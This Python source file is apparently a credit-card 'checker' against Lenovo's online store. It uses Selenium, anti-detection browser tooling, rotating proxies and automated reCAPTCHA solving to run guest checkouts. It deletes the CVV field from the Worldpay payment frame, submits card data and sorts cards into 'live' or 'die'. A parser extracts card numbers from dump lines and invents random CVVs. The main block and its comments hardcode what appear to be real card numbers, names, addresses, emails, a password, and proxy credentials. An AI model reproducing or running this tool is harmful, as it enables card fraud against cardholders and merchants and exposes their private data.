#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import re, random;
import sys, time,os;
from PIL import Image, ImageMath
import json, urllib, base64, mybrowser,captcha2upload
from urllib.parse import urlparse, parse_qsl
import munantiapi, mybrowser
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.actions import interaction
from selenium.webdriver.common.actions.action_builder import ActionBuilder
from selenium.webdriver.common.actions.pointer_input import PointerInput
from pypasser import reCaptchaV2
import datetime
from selenium.webdriver.support.select import Select

class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    listLink = None;

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Lenovo:
    """ Test reg forum
    """


    def __init__(self, mun_browser=None, driver=None, orderfinalForm=[], updatestatus='update',captcha_queue=None, mobile=False, antidetectQueQue=None, statusqueue=None):
        self.updatestatus = updatestatus
        self.orderfinalForm = orderfinalForm;

        # ua.set_debug_responses(False)
        self.captcha_queue = captcha_queue;
        self.statusqueue = statusqueue
        self.mun_browser  = mun_browser
        self.driver = driver
        self.browser = mybrowser.Rqbrowser()
        
        self.decaptcha_key = 'aa15c055da98e4867e9c924dce54f1e2'
        self.mun_api = munantiapi.MunAntiApi()
        self.mobile = mobile
        self.phoneApi = None


    def check_login_page(self):
        
        current_url= self.driver.current_url
        if str(current_url).find('account/login') != -1:
            return True
        else:
            return   
           
    def check_wallet_page(self):
        
        current_url= self.driver.current_url
        if str(current_url).find('wallet/create') != -1:
            return True
        else:
            return      
        
    def check_checkout_page(self):
        current_url= self.driver.current_url
        if str(current_url).find('checkout.html') != -1:
            return True
        else:
            return              
    
    def login(self, email, password):
        print('==login==')
        self.email = email
        self.password = password
        # login_url = 'https://account.lenovo.com/us/en/account/wallet/index.html?orgRef=https%253A%252F%252Fwww.google.com%252F'
        login_url = 'https://account.lenovo.com/us/en/account/login/?orgRef=https%253A%252F%252Fwww.google.com%252F&returnUrl=https%3A%2F%2Faccount.lenovo.com%2Fus%2Fen%2Faccount%2Fwallet%2Fcreate.html'
        self.driver.get(login_url)
        # try:
        #     _evidon_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#_evidon-accept-button")))
        #     print('click to _evidon_present')
        #     self.mun_browser.click_random_offset_element(_evidon_present)
        # except Exception as e:
        #     pass
        WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH, "//iframe[@title='reCAPTCHA']")))
        
        emailAddress_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#emailAddress")))

        # self.mun_browser.send_keys_like_human(emailAddress_present, email )
        # time.sleep(random.uniform(0.05, 0.2))
        password_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#password")))
        
        # self.mun_browser.send_keys_like_human(password_present, password)
        # time.sleep(random.uniform(1, 3))
        print('==trying resolve captcha==')
        recaptchav2api = reCaptchaV2(driver=self.driver, play=False)
        is_checked = recaptchav2api.resolve_captcha()
        if is_checked:    
            print('==trying login==')
            self.mun_browser.scroll_like_human(scoll_times=1)
            signIn_presents = self.driver.find_elements(By.XPATH, "//button[@leclick='doLogin']")

            while signIn_presents:
                signIn_presents = self.driver.find_elements(By.XPATH, "//button[@leclick='doLogin']")
                doCardInfoSave_presents = self.driver.find_elements(By.CLASS_NAME, "my-wallet-card-billing-add-address")
                if signIn_presents and not doCardInfoSave_presents and self.check_login_page():
                    try:
                        time.sleep(random.uniform(1, 3))     
                        self.mun_browser.scroll_like_human(scoll_times=1)
                        emailAddress_present = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#emailAddress")))

                        self.mun_browser.send_keys_like_human(emailAddress_present, email )
                        time.sleep(random.uniform(0.05, 0.2))
                        password_present = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR ,"#password")))
                        
                        self.mun_browser.send_keys_like_human(password_present, password)
                        recaptchav2api = reCaptchaV2(driver=self.driver, play=False)
                        is_checked = recaptchav2api.resolve_captcha()
                        if is_checked:   
                            time.sleep(random.uniform(0.05, 0.1))
                            signIn_present = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, "//button[@leclick='doLogin']")))
                            self.mun_browser.click_random_offset_element(signIn_present)    
                            time.sleep(random.uniform(0.05, 0.1))
                    except Exception as e:
                        continue
                    time.sleep(1)
                else:
                    print('==stop click login button==')
                    self.driver.switch_to.default_content()
                    break 
            return True          
    def get_link_checkout_by_request(self, extraCookies):
        print('==get_link_checkout_by_request==')
        extraHeader = {
    "host":"openapi.lenovo.com",
    "origin":"https://www.lenovo.com",           
    "accept": "*/*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site"
    # "cookie":''
            }
        r = self.browser.open('https://www.lenovo.com/au/en/checkout.html')        
        self.browser.add_header('https://www.lenovo.com/au/en/checkout.html', extraHeader=extraHeader)
        print('==trying get link to checkout==')
        self.browser.add_cookies(extraCookies)
        self.browser.add_cookies_to_header()
        # print(self.browser.header)
        # # html = r.text
        data = {}
        data['recaptcha'] = ''
        data['rr'] = 'false'
        # # while 1:
        #     # print()
        r = self.browser.open('https://openapi.lenovo.com/au/en/api/checkout/payment/cc/iframe', data=data)
        html = r.json()
        link_checkout = html['data']['ccIframeUrl']
        return link_checkout        
    
    def get_cookies_by_chrome(self,sock5='', email='',infoCheckout=''):
        self.driver.get('https://www.lenovo.com/au/')
        # ''
        commonHeaderSearch_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.ID ,'commonHeaderSearch')))  
        time.sleep(2)
        self.mun_browser.send_keys_like_human(commonHeaderSearch_presents, 'ssd' )

        Account_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//div[@data-name='Account']"))) 
        time.sleep(2)
        commonHeaderSearch_presents.send_keys(Keys.ENTER)

        # time.sleep(1)
        # self.driver.get(link_add_to_cart)
        self.browser.set_proxies(sock5=sock5)
        r = self.browser.open('https://www.lenovo.com/au/en/')
        # r = self.browser.open('https://www.lenovo.com/us/en/search?fq=&text=ssd&rows=20&sort=relevance')
        # self.driver.get('https://www.lenovo.com/us/en/search?fq=&text=ssd&rows=20&sort=relevance')
        # WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.CLASS_NAME ,"product_item"))) 
        # self.driver.get('https://www.lenovo.com/us/en/p/accessories-and-software/memory-and-storage/memory-and-storage-hard-drives/78091041')
        list_cookies = self.driver.get_cookies()
        extra_cookies = {}
        for line_cookies in list_cookies:
            if line_cookies['domain'].find('lenovo.com') != -1:
                extra_cookies[line_cookies['name']] = line_cookies['value']            
        # r = self.browser.open('https://www.lenovo.com/us/en/p/accessories-and-software/memory-and-storage/memory-and-storage-hard-drives/78091041')
        data = {}
        data['productSource'] = 'accessoryplp'
        data['qty'] = '1'
        data['productCode'] = '4XF1C39743'
        data['coupon'] = ''
        extraHeader = {
"host":"openapi.lenovo.com",
"origin":"https://www.lenovo.com",           
"accept": "*/*",
"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
"sec-ch-ua-mobile": "?0",
"sec-ch-ua-platform": "\"Windows\"",
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-site"
# "cookie":''
        }
        request_url = 'https://openapi.lenovo.com/au/en/api/cart/item'
        self.browser.add_header('https://www.lenovo.com/au/en/p/accessories-and-software/thinkcentre-and-thinkstation/thinkcentre-and-thinkstation-hard-drives/4xf1c39743', extraHeader=extraHeader)
        print('==trying add to cart==')
        self.browser.add_cookies(extra_cookies)
        self.browser.add_cookies_to_header()            
        r = self.browser.open(request_url, data=data)
        html = r.text
        print(html)
        r = self.driver.get('https://www.lenovo.com/au/en/cart')
        i_time = 0
        while i_time < 5:
            
            # r = self.driver.get('https://www.lenovo.com/us/')
            try:
                if self.check_checkout_page():
                    break
                checkoutButton_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.CLASS_NAME ,'checkoutButton')))  
                print('==click to checkout button==')
                time.sleep(2)
                self.mun_browser.click_random_offset_element(checkoutButton_presents) 
                
                guestButton_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//button[@data-tkey='Guest.Checkout']")))  
                time.sleep(2)
                print('==click to guest checkout button==')
                self.mun_browser.click_random_offset_element(guestButton_presents) 
                time.sleep(2)
                if self.check_checkout_page():
                    break
                else:
                    time.sleep(2)
                    i_time+=1
            except:
                pass
                time.sleep(2)
        if i_time >=5:
            return  
            # r = self.driver.get('https://www.lenovo.com/us/en/checkout.html')
        onEnterManually_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//span[@leclick='onEnterManually']")))  
        time.sleep(2)
        print('==click to onEnterManually_presents button==')

        self.mun_browser.click_random_offset_element(onEnterManually_presents)            

        firstname_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='firstname_id']")))  
        
        self.mun_browser.send_keys_like_human(firstname_id_presents, infoCheckout['first_name'])

        lastname_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='lastname_id']")))  
        
        self.mun_browser.send_keys_like_human(lastname_id_presents, infoCheckout['last_name'])
        
        capture_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='capture_id']"))) 
        
        self.mun_browser.send_keys_like_human(capture_id_presents, infoCheckout['address1'])
        
        capture_id_presents.send_keys(Keys.ENTER)
        
        
        le_address_item_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.CLASS_NAME ,"le_address_item"))) 
        
        self.mun_browser.click_random_offset_element(le_address_item_presents)

        
        # line1_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='line1_id']"))) 
        
        # self.mun_browser.send_keys_like_human(line1_id_presents, infoCheckout['address1'])
        
        
        # postalcode_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='postalcode_id']"))) 
        
        # self.mun_browser.send_keys_like_human(postalcode_id_presents, infoCheckout['zipcode'])
        
        # town_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='town_id']"))) 
        
        # self.mun_browser.send_keys_like_human(town_id_presents, infoCheckout['city'])
        
        email_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='email_id']"))) 
        email_id_presents.send_keys(email)
        # self.mun_browser.send_keys_like_human(email_id_presents, email)
        
        # shipping_region_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//select[@aria-describedby='shipping_region']"))) 
        # shipping_region = Select(shipping_region_presents)
        # shipping_region.select_by_value('US-'+)
        # shipping_region.select_by_index(0)
        phone1_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='phone1_id']")))
        phone1_id_presents.send_keys('5934587432')
        # self.mun_browser.send_keys_like_human(phone1_id_presents, '5934587432')
        
        time.sleep(3)
        goPayment_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//div[@leclick='goPayment']"))) 
        
        self.mun_browser.click_random_offset_element(goPayment_presents)            
        
        methodChanged_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//div[@leclick='methodChanged']"))) 
        # ''
        # firstname_id_presents = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//input[@id='firstname_id']")))  

        # time.sleep(3)
        list_cookies = self.driver.get_cookies()
        extra_cookies = {}
        for line_cookies in list_cookies:
            if line_cookies['domain'].find('lenovo.com') != -1:
                extra_cookies[line_cookies['name']] = line_cookies['value']
        self.driver.quit()
        return extra_cookies
 
    def get_link_checkout(self, sock5='', proxy='',email='', password='', guest=True, infoCheckout={},extra_cookies={}):

            # self.driver.get('https://account.lenovo.com/us/en/account/wallet/index.html')
        print('==get_link_checkout==')
        if guest:
            if not extra_cookies.keys():
                extra_cookies = self.get_cookies_by_chrome(sock5=sock5, email=email,infoCheckout=infoCheckout)
            
            link_checkout = self.get_link_checkout_by_request(extraCookies=extra_cookies)
            print(link_checkout)
            return link_checkout
      
        else:
            if email and password:
                self.login(email, password)
            else:
                # wallet_page = self.check_wallet_page()
                # if wallet_page:
                #     self.driver.refresh()            
                # else:
                i=0
                while i < 3:
                    self.driver.get('https://account.lenovo.com/us/en/account/wallet/index.html')
                    add_card_text_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.CLASS_NAME ,"my-wallet-content-add-card-text")))
                    time.sleep(1)
                    self.mun_browser.click_random_offset_element(add_card_text_present) 
                    # doCardInfoSave_presents = self.driver.find_elements(By.CLASS_NAME, "my-wallet-card-billing-add-address")
                    try:
                        billing_present = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME ,"my-wallet-card-billing-add-address")))
                    except Exception as e:
                        time.sleep(2)
                        i+=1
                        continue
                    else:
                        break
                    # if not billing_present:
                
                
                # self.driver.get('https://account.lenovo.com/us/en/account/wallet/create.html')
            try:
                card_present = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH ,"//iframe[@id='wp-cl-my-wallet-card-ifram-iframe']")))      
            except Exception as e:
                print('=========wp-cl-my-wallet-card-ifram-iframe=====')
            else:
                link_checkout = card_present.get_attribute('src')
                return link_checkout

            br_log = self.mun_browser.get_browser_log()
            # print(br_log[-1])
            requestID = None
            for line_log in br_log:
                if 'response' in line_log['params']:
                    if line_log['params']['response']['url'].find('getIframAddress') != -1:
                        requestID = line_log['params']['requestId']
                        break
            if requestID:
                print('==requestID==',requestID)
                bodyResult = self.mun_browser.get_event_body(requestID)
                print(bodyResult)
                link_checkoutre = re.search('iframeUrl":"(.+?)"',str(bodyResult))
                if link_checkoutre:
                    link_checkout = link_checkoutre.group(1)
                    return link_checkout
                else:
                    raise '==Get Link Error==' 
                    
        # all_cookies = self.driver.execute_cdp_cmd('Network.getAllCookies', {})
        # list_cookies = all_cookies['cookies']
        # extra_cookies = {}
        # for line_cookies in list_cookies:
        #     if line_cookies['domain'].find('lenovo') != -1:
        #         extra_cookies[line_cookies['name']] = line_cookies['value']
        # self.browser.add_cookies(extra_cookies)  
        # headers = {
        #     "accept": "*/*",
        #     "accept-encoding":"gzip, deflate, br",
        #     "accept-language": "en-US;en",
        #     "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        #     # "sec-ch-ua-mobile": "?1",
        #     "sec-ch-ua-platform": "Windows",
        #     "sec-fetch-dest": "empty",
        #     "sec-fetch-mode": "cors",
        #     "sec-fetch-site": "same-site"
        #     # 'host':'openapi.lenovo.com',
        #     # 'origin':'https://openapi.lenovo.com',

        # }
        # self.browser.set_proxies(sock5=sock5)
        # self.browser.add_header('https://account.lenovo.com/us/en/account/wallet/create.html', extraHeader=headers)
        # r = self.browser.open('https://openapi.lenovo.com/us/en/auth/assign_cookie?loyalty=1') 
        # self.browser.add_header('https://account.lenovo.com/us/en/account/wallet/create.html')
        # cookiesRaw = self.browser.add_cookies_to_header()
        # # print(cookiesRaw)
        # r = self.browser.open('https://openapi.lenovo.com/us/en/v1/payment/getIframAddress?walletId=', timeout=10)
        # html = r.text
        # link_checkoutre = re.search('iframeUrl":"(.+?)"',html)
        # if link_checkoutre:
        #     link_checkout = link_checkoutre.group(1)
        #     return link_checkout
    

                             
    def check_out(self, checkoutInfo={}, sock5='', proxy=''):
        
        # WebDriverWait(self.driver, 30).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH ,"//iframe[@id='wp-cl-my-wallet-card-ifram-iframe']")))  
            
        # # self.driver.switch_to.frame(card_present)

        # cardNumber_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='cardNumber']"))) 

        # self.mun_browser.send_keys_like_human(cardNumber_present, checkoutInfo['ccnumber'] )
        
        # cardholderName_presents = self.driver.find_elements(By.XPATH ,"//input[@id='cardholderName']")


        # self.mun_browser.send_keys_like_human(cardholderName_presents[0], checkoutInfo['first_name']+ ' ' +checkoutInfo['last_name'])  
        
        # expiryMonth_presents = self.driver.find_elements(By.XPATH ,"//input[@id='expiryMonth']")

        # self.mun_browser.send_keys_like_human(expiryMonth_presents[0], checkoutInfo['ccmonth'])  
        
        # expiryYear_presents = self.driver.find_elements(By.XPATH ,"//input[@id='expiryYear']")

        # self.mun_browser.send_keys_like_human(expiryYear_presents[0], checkoutInfo['ccyear'])  
        
        
        # securityCode_presents = self.driver.find_elements(By.XPATH ,"//input[@id='securityCode']")
        
        

        # self.driver.execute_script("""
        #     var element = arguments[0];
        #     element.parentNode.removeChild(element);
        #     """, securityCode_presents[0])        
        
        # submitButton_presents = self.driver.find_elements(By.XPATH ,"//input[@id='submitButton']")
        # time.sleep(1)
        # print('submitButton_presents', submitButton_presents)
    
        # self.mun_browser.click_random_offset_element(submitButton_presents[0])  
        
        # paymentResult_presents = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.ID ,'paymentResult')))  
        
        # print('==finish==',paymentResult_presents.get_attribute('data-page-title'))
        # result = paymentResult_presents.get_attribute('data-page-title')
        
        # resultTryAgain_presents = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//a[@id='resultTryAgain']")))  

        # self.mun_browser.click_random_offset_element(resultTryAgain_presents) 
        # self.driver.switch_to.default_content()
        # if result.find('Transaction Declined') != -1:
        #     print('===cc die===')
        #     return
        # elif result.find('Transaction Successful') != -1:
        #     print('===live===')
        #     return checkoutInfo
        # else:
        #     # c = open('dien.html', 'w', encoding='utf8')
        #     # c.write(r.text)
        #     raise TimeoutError('Unknown status')
        
        # self.driver.switch_to.default_content()
                      
        # time.sleep(random.uniform(0.05, 0.2))  
        check_status = {'suspended':False, 'success': False, 'unknown': False, 'msg':''}
        
        headers = {
            "accept": "*/*",
            "accept-encoding":"gzip, deflate, br",
            "accept-language": "en-US;en",
            "sec-ch-ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            # 'host':'openapi.lenovo.com',
            # 'origin':'https://openapi.lenovo.com',
        }              
        checkoutURL = checkoutInfo['checkout_url']
        print(checkoutURL)
        self.driver.get(checkoutURL)
        
        try:
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='cardNumber']")))
        except:
            html_source_code = self.driver.execute_script("return document.body.innerHTML;")
            if html_source_code.find('This payment has already been processed') != -1:
                check_status['suspended'] = True
                check_status['msg'] = 'Sorry, there was a problem processing your payment'
                return check_status
             
            elif html_source_code.find('Sorry, there was a problem processing your payment') != -1:    
                check_status['suspended'] = True
                check_status['msg'] = 'Sorry, there was a problem processing your payment'                
            else:
                check_status['unknown'] = True
                check_status['msg'] = '==Unknown status==1'                   

        print('==trying resolve captcha==')
        WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//iframe[@title='reCAPTCHA']")))
        recaptchav2api = reCaptchaV2(driver=self.driver, play=False)
        is_checked = recaptchav2api.resolve_captcha()
        if is_checked:            
            print('===pass===')
            securityCode_presents = self.driver.find_elements(By.XPATH ,"//input[@id='securityCode']")
            self.driver.execute_script("""
                var element = arguments[0];
                element.parentNode.removeChild(element);
                """, securityCode_presents[0]) 
            
            cardNumber_present = WebDriverWait(self.driver, 30).until(EC.presence_of_element_located((By.XPATH ,"//input[@id='cardNumber']"))) 

            cardNumber_present.send_keys(checkoutInfo['ccnumber'])
            # self.mun_browser.send_keys_like_human(cardNumber_present, checkoutInfo['ccnumber'] )
            
            cardholderName_presents = self.driver.find_elements(By.XPATH ,"//input[@id='cardholderName']")

            cardholderName_presents[0].send_keys(checkoutInfo['first_name']+ ' ' +checkoutInfo['last_name'])
            # self.mun_browser.send_keys_like_human(cardholderName_presents[0], checkoutInfo['first_name']+ ' ' +checkoutInfo['last_name'])  
            
            expiryMonth_presents = self.driver.find_elements(By.XPATH ,"//input[@id='expiryMonth']")
            
            expiryMonth_presents[0].send_keys(checkoutInfo['ccmonth'])
            # self.mun_browser.send_keys_like_human(expiryMonth_presents[0], checkoutInfo['ccmonth'])  
            
            expiryYear_presents = self.driver.find_elements(By.XPATH ,"//input[@id='expiryYear']")

            expiryYear_presents[0].send_keys(checkoutInfo['ccyear'])
            # self.mun_browser.send_keys_like_human(expiryYear_presents[0], checkoutInfo['ccyear'])  
            submitButton_presents = self.driver.find_elements(By.XPATH ,"//input[@id='submitButton']")
            # time.sleep(1)
            print('submitButton_presents', submitButton_presents)
        
            self.mun_browser.click_random_offset_element(submitButton_presents[0])  
            try:
                resultTitle_present = WebDriverWait(self.driver, 30).until(EC.visibility_of_element_located((By.XPATH ,"//h2[@id='resultTitle']"))) 
                text = resultTitle_present.get_attribute('innerText')
            except:
                print('===cc vbv die===')
                check_status['msg'] = 'Transaction Declined'
                return check_status
            else:
                if text.strip() == 'Declined':
                    print('===cc die===')
                    check_status['msg'] = 'Transaction Declined'
                    return check_status
                elif text.strip() == 'Success':
                    print('===live===', checkoutInfo)
                    check_status['suspended'] = True
                    check_status['success'] = True
                    check_status['msg'] = checkoutInfo
                    return check_status
                else:
                    c = open('dien.html', 'w', encoding='utf8')
                    c.write(text)
                    check_status['unknown'] = True
                    check_status['msg'] = '==Unknown status==1'
                    return check_status
        # self.brCheckout = mybrowser.Rqbrowser()
        # self.brCheckout.set_proxies(sock5=sock5, proxy=proxy)
        # self.brCheckout.add_header(checkoutURL)
        # r = self.brCheckout.open(checkoutURL)
        # html = r.text
        # # c = open('dien.html', 'w', encoding='utf8')
        # # c.write(r.text)
        # brForms = self.brCheckout.selectForm(html)
        # # inputForm = self.browser.getInputForm(brForms[0])
        # if brForms:
        #     actionURL = self.brCheckout.getActionUrl(brForms[0])
        #     # print(inputForm, actionURL)
        #     _csrf_re = re.search('name="_csrf" value="(.+?)"', html)
        #     if _csrf_re:
        #         _csrf = _csrf_re.group(1).strip()
        #         print(_csrf)

        #         data = {}
        #         # data['selectedPaymentMethodName'] = ''
        #         data['cardNumber'] = checkoutInfo['ccnumber']
        #         data['cardholderName'] = checkoutInfo['first_name']+ ' ' +checkoutInfo['last_name']
        #         data['expiryDate.expiryMonth'] = checkoutInfo['ccmonth']
        #         data['expiryDate.expiryYear'] = checkoutInfo['ccyear']
        #         data['securityCodeVisibilityType'] = 'OPTIONAL'
        #         data['mandatoryForUnknown'] = False
        #         data['dfReferenceId'] = ''
        #         data['tmxSessionId'] = ''
        #         data['_csrf'] = _csrf
        #         request_url = 'https://payments.worldpay.com'+actionURL
        #         print(request_url)
        #         self.brCheckout.add_header(request_url, XMLHttpRequest=True, extraHeader={'x-hpp-ajax':'1','content-type':'application/x-www-form-urlencoded; charset=UTF-8','accept':'*/*','accept-encoding':'gzip, deflate, br','Origin':'https://payments.worldpay.com', 'Host':'payments.worldpay.com', 'sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-platform':'Windows','sec-fetch-mode':'cors', 'sec-fetch-site':'same-origin'})
        #         # print(br.all_cookies)
        #         r = self.brCheckout.open(request_url, data=data)
        #         html = r.text
        #         if html.find('Transaction Declined') != -1 or html.find('Cardholder authentication') != -1:
        #             print('===cc die===')
        #             check_status['msg'] = 'Transaction Declined'
        #             return check_status
        #         elif html.find('Transaction Successful') != -1:
        #             print('===live===', checkoutInfo)
        #             check_status['suspended'] = True
        #             check_status['success'] = True
        #             check_status['msg'] = checkoutInfo
        #             return check_status
        #         else:
        #             c = open('dien.html', 'w', encoding='utf8')
        #             c.write(r.text)
        #             check_status['unknown'] = True
        #             check_status['msg'] = '==Unknown status==1'
        #             return check_status
        #     else:
        #         check_status['unknown'] = True
        #         check_status['msg'] = '==Unknown status==2'
        #         return check_status
        # elif html.find('Sorry, there was a problem processing your payment') != -1 or html.find('The web server reported a bad gateway error') != -1:
        #     check_status['suspended'] = True
        #     check_status['msg'] = 'Sorry, there was a problem processing your payment'
        #     return check_status
        # else:
        #     c = open('dien.html', 'w', encoding='utf8')
        #     c.write(r.text)
        #     check_status['unknown'] = True
        #     check_status['msg'] = '==Unknown status==3'
        #     return check_status

    def check(self, checkoutInfo={}, sock5='', proxy=''):
        checkout = self.check_out(checkoutInfo, sock5=sock5, proxy=proxy)
        return checkout

def parse_cc(line_string):
    list_email = line_string.replace("/", "|").split('|')
    alphabet = '0123456789012345678901234567890123456789'
    min = 4
    max = 4
    stringimg = ''
    for x in random.sample(alphabet, random.randint(min, max)):
        stringimg += x
    ccv_random = stringimg
    i = 0
    while i < len(list_email):
        line_email = list_email[i].replace('\\', '|').replace("/", "|").replace(' ', "").replace('-', "")
        if 14 < len(line_email) <= 16 and line_email.strip().isdigit():
            cardNumber = line_email.strip()
            next_string = list_email[i + 1].strip()
            if not next_string.isdigit():
                expMonth = list_email[i + 2].strip()
                if len(expMonth) == 4:
                    thang1 = expMonth[:2]
                    so = thang1[:1]
                    expYear = expMonth[2:]
                    if i + 3 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 3].strip()
                if len(expMonth) == 2:
                    thang1 = expMonth
                    so = thang1[:1]
                    expYear = list_email[i + 3].strip()
                    if i + 4 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 4].strip()
                if len(expMonth) == 1:
                    thang1 = expMonth
                    so = thang1
                    expYear = list_email[i + 3].strip()
                    if i + 4 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 4].strip()
                if len(expMonth) == 6:
                    thang1 = expMonth[:2]
                    so = thang1[:1]
                    expYear = expMonth[2:]
                    if i + 3 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 3].strip()
            else:
                expMonth = next_string
                if len(expMonth) == 4:
                    thang1 = expMonth[:2]
                    so = thang1[:1]
                    expYear = expMonth[2:]
                    if i + 2 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 2].strip()
                if len(expMonth) == 2:
                    thang1 = expMonth
                    so = thang1[:1]
                    expYear = list_email[i + 2].strip()
                    if i + 3 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 3].strip()
                if len(expMonth) == 1:
                    thang1 = expMonth
                    so = thang1
                    expYear = list_email[i + 2].strip()
                    if i + 3 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 3].strip()
                if len(expMonth) == 6:
                    thang1 = expMonth[:2]
                    so = thang1[:1]
                    expYear = expMonth[2:]
                    if i + 2 > len(list_email) - 1:
                        ccv = ccv_random
                    else:
                        ccv = list_email[i + 2].strip()
            if len(expYear) == 2:
                nam = "20" + expYear
            else:
                nam = expYear
            try:
                d = int(nam)
                hoho = int(thang1)
            except ValueError:
                pass
            else:
                if so == "0":
                    thang12 = thang1[1:2]
                else:
                    thang12 = thang1
                dien = int(thang12)
                if dien <= 12:
                    if 2 < len(ccv) < 5:
                        try:
                            b = int(ccv)
                        except ValueError:
                            ccv = ccv_random
                    else:
                        ccv = ccv_random
                    thang123 = thang12
                    if len(thang12) == 1:
                        thang = "0" + thang12
                    else:
                        thang = thang12
                    now = datetime.datetime.now()
                    while d <= now.year:
                        if d == now.year and int(thang) >= now.month:
                            break
                        d += 3
                    nam = str(d)
                    if d >= 2022:
                        if len(nam) == 4:
                            nam1 = nam[2:]
                        thangnam = thang + nam1
                    return {'ccnumber': cardNumber, 'ccmonth': thang, 'ccyear': nam1, 'ccv': ccv}        
        
def main():


    listbilling = 'Yingge|Wang|39078 Guradino Dr. APT 308||Fremont|CA|94538|Visa6087|4388576044536087|2|2019'
    list_address_drop = 'Yingge|Wang|39078 Guradino Dr. APT 308||Fremont|CA|94538|Visa6087|4388576044536087|2|2019'
    #1288375392|FPTgeoEICiYnzs@sbcglobal.net|brynargust@yahoo.com|bryn0320
    #4147098647146372|12|2019|00|Brandon Braun|Address||||||bdogg3000@gmail.com
    #5376280708882256|12|2026
    mun_browser = mybrowser.MunAntiBrowser()
    # profile_info  = mun_browser.create_random_profile(phoneOs='iPhone', sock5='192.168.8.108:30000')
    # inject_data = mun_browser.get_inject_data()
    # # # print(profile_info)
    # driver = mun_browser.setting(inject_str=inject_data,
    #                     profileInfo=profile_info, onetime=False, type_browser='Chrome', pageLoad=False)
    driver = mun_browser.open_random_driver(sock5='Bproxy2023-rotate:Hanoi2023@p.webshare.io:80', pageLoad=False, phoneOs='')
    # driver = None
